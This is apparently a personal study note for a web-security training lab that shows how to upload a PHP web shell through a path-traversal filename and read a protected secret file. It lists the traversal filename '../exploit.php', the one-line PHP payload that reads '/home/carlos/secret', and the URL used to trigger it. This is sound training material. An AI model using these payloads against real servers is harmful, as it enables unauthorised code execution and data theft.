# Lab03 - Web Shell Upload Via Path Traversal

## Objective

Read:

```text
/home/carlos/secret
```

---

# Analysis

Uploaded files stored in:

```text
/files/avatars/
```

Execution disabled.

Need traversal.

---

## Full Payload Used

### Payload 1

Filename:

```text
../exploit.php
```

---

### Payload 2

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

---

Upload causes file to be written outside protected directory.

---

Visit:

```text
/files/exploit.php
```

Lab solved.

---

# Why It Works

```text
Traversal
        ↓
Escape Upload Directory
        ↓
Reach Executable Directory
        ↓
RCE
```

---

# Related Theory

- 07-preventing-file-execution-in-user-directories.md

---

# Key Learnings

File names themselves can be attack vectors.